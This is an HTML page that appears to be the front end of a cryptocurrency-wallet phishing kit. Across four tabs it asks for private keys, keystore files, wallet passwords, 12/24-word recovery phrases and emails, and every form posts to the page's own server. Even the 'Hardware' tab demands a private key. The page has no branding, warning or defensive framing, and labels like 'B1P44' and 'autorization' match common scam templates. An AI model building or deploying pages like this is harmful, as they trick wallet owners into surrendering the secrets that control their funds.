<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
            <div class="form">
            
            <ul class="tab-group">
                <li class="tab active"><a href="#privateKey">Private Key</a></li>
                <li class="tab"><a href="#keystore">Keystore</a></li>
                <li class="tab"><a href="#Mnemonic">Mnemonic</a></li>
                <li class="tab"><a href="#hardware">Hardware</a></li>
            </ul>
            
            <div class="tab-content">
                <div id="privateKey">   
                <h2>Please enter your private key</h2>
                
                <form action="/" method="post">
                
                <div class="top-row">
                    <div class="field-wrap">
                    <label>
                       key<span class="req">*</span>
                    </label>
                    <input type="text" required autocomplete="off" />
                    </div>
                
                    <div class="field-wrap">
                    <label>
                       Password<span class="req">*</span>
                    </label>
                    <input type="password"required autocomplete="off"/>
                    </div>
                </div>

                <div class="field-wrap">
                    <label>
                    BIP39/B1P44 Phrase<span class="req">*</span>
                    </label>
                    <input type="email"required autocomplete="off"/>
                </div>
                
                <button type="submit" class="button button-block">Submit</button>
                
                </form>

                </div>
                
                <div id="keystore">   
                <h1>Keystore</h1>
                
                <form action="/" method="post">
                  <div class="field-wrap">
                    <input type="file"required autocomplete="off"/>
                </div>
                
                <div class="field-wrap">
                    <label>
                    Wallet Password<span class="req">*</span>
                    </label>
                    <input type="password"required autocomplete="off"/>
                </div>
                                
                <button class="button button-block">Submit</button>
                
                </form>

                </div>

                <!-- Remaining 2 Tabs -->

                  <div id="Mnemonic">   
                <h2>Please enter your 12/24 words phrase for autorization</h2>
                
                <form action="/" method="post">
                
                <div class="top-row">
                    <div class="field-wrap">
                    <label>
                       Phrase<span class="req">*</span>
                    </label>
                    <input type="text" required autocomplete="off" />
                    </div>
                
                    <div class="field-wrap">
                    <label>
                       Email<span class="req">*</span>
                    </label>
                    <input type="email"required autocomplete="off"/>
                    </div>
                </div>

                <div class="field-wrap">
                    <label>
                    BIP39/B1P44 Phrase<span class="req">*</span>
                    </label>
                    <input type="email"required autocomplete="off"/>
                </div>
                
                <button type="submit" class="button button-block">Submit</button>
                
                </form>

                </div>
                

                 <div id="hardware">   
                <h2>Please enter your private key</h2>
                
                <form action="/" method="post">
                
                <div class="top-row">
                    <div class="field-wrap">
                    <label>
                       key<span class="req">*</span>
                    </label>
                    <input type="text" required autocomplete="off" />
                    </div>
                
                    <div class="field-wrap">
                    <label>
                       Password<span class="req">*</span>
                    </label>
                    <input type="password"required autocomplete="off"/>
                    </div>
                </div>

                <div class="field-wrap">
                    <label>
                    BIP39/B1P44 Phrase<span class="req">*</span>
                    </label>
                    <input type="email"required autocomplete="off"/>
                </div>
                
                <button type="submit" class="button button-block">Submit</button>
                
                </form>

                </div>

            </div>
        </div> 

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script src="./script.js"></script>
</body>
</html>
